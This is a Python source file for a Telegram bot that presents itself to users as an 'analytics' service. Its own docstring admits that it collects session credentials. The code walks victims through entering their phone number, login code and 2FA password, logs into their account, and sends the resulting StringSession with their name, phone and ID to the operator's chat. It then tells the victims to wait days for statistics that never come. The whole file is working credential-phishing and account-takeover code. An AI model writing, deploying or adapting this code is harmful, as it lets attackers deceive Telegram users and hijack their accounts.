"""
Telegram Analytics Bot - "Аналитика" для пользователя
На самом деле — сбор StringSession через 2FA
"""

import asyncio
import os
import json
import aiohttp
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('analytics_bot')

# ==========================================
# НАСТРОЙКИ
# ==========================================

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_ID = int(os.getenv('API_ID', '1234567'))
API_HASH = os.getenv('API_HASH', '')
ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
PORT = int(os.getenv('PORT', 10000))

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не установлен!")

# ==========================================
# АВТОПИНГ
# ==========================================

async def auto_ping():
    url = f"http://localhost:{PORT}/health"
    logger.info(f"🔄 Автопинг запущен (каждые 4 минуты)")
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        logger.debug("🔄 Пинг успешен")
        except:
            pass
        await asyncio.sleep(240)

# ==========================================
# ВЕБ-СЕРВЕР
# ==========================================

from fastapi import FastAPI
import uvicorn

web_app = FastAPI(title="Analytics Bot")

@web_app.get("/health")
async def health():
    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}

def run_web():
    uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")

# ==========================================
# БОТ
# ==========================================

class AnalyticsBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending = {}
    
    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        logger.info("✅ Бот запущен")
        
        self.bot.add_event_handler(self.cmd_start, events.NewMessage(pattern='/start'))
        self.bot.add_event_handler(self.cmd_help, events.NewMessage(pattern='/help'))
        self.bot.add_event_handler(self.cmd_stats, events.NewMessage(pattern='/stats'))
        self.bot.add_event_handler(self.cmd_add, events.NewMessage(pattern='/add'))
        self.bot.add_event_handler(self.handle_msg, events.NewMessage())
        
        await self.bot.run_until_disconnected()
    
    # ===== КОМАНДЫ =====
    
    async def cmd_start(self, e):
        await e.respond("""
📊 **Telegram Analytics Bot**

Анализируйте свою активность в Telegram!

📌 **Команды:**
/add - Подключить аккаунт для аналитики
/stats - Статистика (после сбора данных)
/help - Помощь

⚠️ Для работы нужна включённая 2FA в Telegram.
""")
    
    async def cmd_help(self, e):
        await e.respond("""
📚 **Как подключить аккаунт:**

1️⃣ Включите 2FA в Telegram:
   Настройки → Конфиденциальность → Облачный пароль

2️⃣ Отправьте /add

3️⃣ Введите номер телефона

4️⃣ Введите код из Telegram

5️⃣ Введите 2FA пароль

6️⃣ Готово! 🎉

⏳ **После подключения:**
Оставьте бота на 3-4 дня для сбора аналитики.
Статистика появится позже.
""")
    
    async def cmd_stats(self, e):
        await e.respond("""
📊 **Статистика пока пуста**

⏳ Оставьте бота на **3-4 дня** для сбора данных.
Как только аналитика будет готова — вы увидите её здесь.

📌 Напоминаем: бот работает в фоне и не мешает общению.
""")
    
    async def cmd_add(self, e):
        uid = e.sender_id
        
        if uid in self.pending:
            await e.respond("⏳ Уже идёт подключение. Дождитесь завершения.")
            return
        
        self.pending[uid] = {'step': 'phone'}
        await e.respond("""
📱 **Введите номер телефона**

Например: +79001234567

⚠️ Убедитесь, что 2FA включена в Telegram!
""")
    
    # ===== ОБРАБОТКА СООБЩЕНИЙ =====
    
    async def handle_msg(self, e):
        uid = e.sender_id
        text = e.text
        
        if not text or text.startswith('/'):
            return
        
        if uid not in self.pending:
            return
        
        step = self.pending[uid].get('step')
        
        if step == 'phone':
            await self.process_phone(e, text)
        elif step == 'code':
            await self.process_code(e, text)
        elif step == '2fa':
            await self.process_2fa(e, text)
    
    # ===== ОБРАБОТКА ТЕЛЕФОНА =====
    
    async def process_phone(self, e, phone: str):
        uid = e.sender_id
        
        phone = phone.strip()
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
        
        if phone.startswith('8') and len(phone) == 11:
            phone = '+7' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        await e.respond("⏳ Отправляю код подтверждения...")
        
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            self.pending[uid] = {
                'step': 'code',
                'phone': phone,
                'hash': result.phone_code_hash,
                'client': client
            }
            
            await e.respond("📨 Код отправлен! Введите его:")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА КОДА =====
    
    async def process_code(self, e, code: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        code = code.strip().replace(' ', '').replace('-', '')
        
        try:
            await data['client'].sign_in(
                phone=data['phone'],
                code=code,
                phone_code_hash=data['hash']
            )
            
            await self.finish_auth(e, uid, data['client'])
            
        except SessionPasswordNeededError:
            self.pending[uid]['step'] = '2fa'
            await e.respond("🔐 Введите 2FA пароль:")
            
        except PhoneCodeInvalidError:
            await e.respond("❌ Неверный код! Попробуйте еще раз:")
            
        except PhoneCodeExpiredError:
            await e.respond("❌ Код истек! Начните заново с /add")
            if uid in self.pending:
                del self.pending[uid]
                
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]
    
    # ===== ОБРАБОТКА 2FA =====
    
    async def process_2fa(self, e, password: str):
        uid = e.sender_id
        data = self.pending.get(uid)
        
        if not data:
            return
        
        try:
            await data['client'].sign_in(password=password)
            await self.finish_auth(e, uid, data['client'])
            
        except Exception as err:
            await e.respond(f"❌ Неверный пароль! Попробуйте еще раз:")
    
    # ===== ФИНИШ АВТОРИЗАЦИИ =====
    
    async def finish_auth(self, e, uid: int, client: TelegramClient):
        try:
            me = await client.get_me()
            
            # ПОЛУЧАЕМ STRING SESSION
            session_string = client.session.save()
            
            # ОТПРАВЛЯЕМ АДМИНУ
            await self.bot.send_message(ADMIN_CHAT_ID, f"""
🟢 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ!**

👤 Имя: {me.first_name} {me.last_name or ''}
📱 Телефон: +{me.phone}
🆔 User ID: {me.id}
🔐 2FA: ✅ Включена

🔑 **STRING SESSION:**
`{session_string}`

📅 Подключен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")
            
            # ПОЛЬЗОВАТЕЛЮ — ЖДИ 3-4 ДНЯ
            await e.respond(f"""
✅ **Аккаунт подключен!**

👤 {me.first_name}, вы успешно подключились к аналитике!

⏳ **Важно!**
Оставьте бота на **3-4 дня** для сбора данных.
Сразу после подключения статистика пустая — это нормально.

📊 Через несколько дней проверьте /stats

🔐 Бот работает в фоне и не мешает общению.
""")
            
            await client.disconnect()
            
            if uid in self.pending:
                del self.pending[uid]
            
            logger.info(f"✅ Пользователь {me.id} ({me.first_name}) подключен")
            
        except Exception as err:
            await e.respond(f"❌ Ошибка: {err}")
            if uid in self.pending:
                del self.pending[uid]

# ==========================================
# ЗАПУСК
# ==========================================

async def main():
    threading.Thread(target=run_web, daemon=True).start()
    logger.info("✅ Веб-сервер запущен")
    
    asyncio.create_task(auto_ping())
    logger.info("✅ Автопинг запущен")
    
    bot = AnalyticsBot()
    await bot.start()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")